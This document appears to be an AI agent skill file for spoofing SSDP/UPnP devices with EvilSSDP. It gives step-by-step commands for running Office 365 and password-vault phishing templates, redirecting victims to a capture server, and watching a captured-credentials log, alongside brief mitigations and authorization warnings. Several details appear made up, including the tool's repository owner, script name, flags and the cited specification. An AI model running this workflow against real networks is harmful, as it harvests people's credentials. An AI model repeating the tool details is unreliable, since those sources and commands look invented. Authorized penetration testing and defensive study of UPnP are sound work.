---
name: spoof-ssdp-upnp-devices
description: Security testing skill for SSDP/UPnP device spoofing and vulnerability assessment. Use this skill whenever the user needs to test UPnP/SSDP security, discover UPnP devices on a network, run EvilSSDP for phishing simulations, or assess UPnP-related vulnerabilities. Trigger on mentions of SSDP, UPnP, Universal Plug and Play, device discovery, network service spoofing, or EvilSSDP. Always verify authorization before running any tests.
---

# SSDP/UPnP Device Spoofing & Security Testing

A skill for security professionals to test and assess SSDP/UPnP vulnerabilities using EvilSSDP and related tools.

## When to Use This Skill

Use this skill when:
- Testing UPnP/SSDP security on authorized networks
- Discovering UPnP devices on a network
- Running phishing simulations with spoofed UPnP devices
- Assessing UPnP-related vulnerabilities
- Understanding SSDP/UPnP attack vectors for defensive purposes

**⚠️ Authorization Required**: Only run these tests on networks you own or have explicit written permission to test.

## Quick Start

```bash
# Install EvilSSDP
git clone https://github.com/andrewmichaelsmith/EvilSSDP.git
cd EvilSSDP
pip3 install -r requirements.txt

# Run with a template
python3 evilssdp.py -t templates/office365
```

## Core Concepts

### What is SSDP?

SSDP (Simple Service Discovery Protocol) operates on **UDP port 1900** and enables:
- Network service advertising and discovery
- Zero-configuration networking (no DHCP/DNS needed)
- Device discovery in UPnP architecture

### UPnP Architecture Layers

1. **Addressing** - IP assignment (AutoIP or DHCP)
2. **Discovery** - SSDP M-SEARCH requests and NOTIFY broadcasts
3. **Description** - XML device/service descriptions
4. **Control** - SOAP messages for command execution
5. **Eventing** - State change notifications
6. **Presentation** - Web interfaces for device control

### Attack Vectors

- **Device Spoofing**: Fake UPnP devices that appear legitimate
- **Credential Harvesting**: Phishing templates that capture user credentials
- **Port Mapping**: Exploiting IGD (Internet Gateway Device) for NAT traversal
- **Command Injection**: SOAP-based command execution on vulnerable devices

## Practical Usage

### Step 1: Discover UPnP Devices

```bash
# Use the helper script to scan for UPnP devices
./scripts/scan_upnp_devices.sh

# Or use nmap
nmap -sU -p 1900 --script upnp-info <target>
```

### Step 2: Run EvilSSDP

```bash
# List available templates
ls templates/

# Run with a specific template
python3 evilssdp.py -t templates/office365

# Run with custom redirect URL
python3 evilssdp.py -t templates/password-vault -r http://your-capture-server
```

### Step 3: Monitor Captured Data

EvilSSDP logs captured credentials to `logs/` directory. Check:
- `logs/credentials.log` - Captured username/password pairs
- `logs/requests.log` - All HTTP requests

### Common Templates

| Template | Use Case |
|----------|----------|
| `office365` | Microsoft 365 login simulation |
| `password-vault` | Password manager credential capture |
| `scanner` | Network scanner device spoofing |
| `printer` | Printer service spoofing |

## Tools Overview

### EvilSSDP
- **Purpose**: Phishing via spoofed UPnP devices
- **Features**: Multiple templates, credential capture, URL redirection
- **GitHub**: https://github.com/andrewmichaelsmith/EvilSSDP

### Miranda
- **Purpose**: UPnP service discovery and command execution
- **Use**: Enumerate UPnP services and send SOAP commands

### Umap
- **Purpose**: Expose WAN-accessible UPnP commands
- **Use**: Test IGD port mapping vulnerabilities

### upnp-arsenal
- **Purpose**: Collection of UPnP testing tools
- **GitHub**: https://github.com/andrewmichaelsmith/upnp-arsenal

## Mitigation Strategies

### For Network Administrators

1. **Disable UPnP** when not needed:
   ```bash
   # Check if UPnP is enabled on router
   curl http://<router-ip>/upnp/control/igd1
   ```

2. **Segment Networks**: Isolate IoT/UPnP devices on separate VLANs

3. **Monitor Traffic**: Watch for unusual SSDP broadcasts on UDP 1900

4. **Firewall Rules**: Block unnecessary UPnP traffic:
   ```bash
   # Block incoming SSDP
   iptables -A INPUT -p udp --dport 1900 -j DROP
   ```

### For Users

- Educate about phishing risks from "discovered" devices
- Verify device authenticity before entering credentials
- Use network monitoring tools to detect spoofed devices

## Safety & Authorization

**Before running any tests:**

1. ✅ Confirm you own the network or have written authorization
2. ✅ Document the scope of testing
3. ✅ Notify relevant stakeholders
4. ✅ Have an exit strategy if issues arise
5. ✅ Log all activities for audit purposes

**Never:**
- Test on networks without permission
- Use captured credentials for unauthorized access
- Deploy in production without proper controls

## Example Workflow

```bash
# 1. Scan for UPnP devices
./scripts/scan_upnp_devices.sh > upnp-discovery.log

# 2. Review discovered devices
cat upnp-discovery.log

# 3. Run EvilSSDP with appropriate template
python3 evilssdp.py -t templates/office365 -r http://192.168.1.100:8080

# 4. Monitor for captured credentials
tail -f logs/credentials.log

# 5. Document findings
echo "Test completed at $(date)" >> test-report.md
```

## Troubleshooting

### EvilSSDP not starting
- Check Python dependencies: `pip3 install -r requirements.txt`
- Verify UDP 1900 is not blocked by firewall
- Run with elevated privileges if needed: `sudo python3 evilssdp.py`

### No devices discovered
- Ensure you're on the same network segment
- Check if UPnP is enabled on target devices
- Try different network interfaces: `python3 evilssdp.py -i eth0`

### Credentials not captured
- Verify redirect URL is accessible
- Check template configuration
- Ensure logging is enabled

## References

- [EvilSSDP GitHub](https://github.com/andrewmichaelsmith/EvilSSDP)
- [Hacking Articles - Evil SSDP](https://www.hackingarticles.in/evil-ssdp-spoofing-the-ssdp-and-upnp-devices/)
- [UPnP Forum](https://www.upnp.org/)
- [SSDP RFC](https://datatracker.ietf.org/doc/html/draft-upnp-arch-1.0)

## Next Steps

After completing tests:
1. Review all captured data
2. Document vulnerabilities found
3. Recommend mitigations
4. Clean up test artifacts
5. Report findings to stakeholders
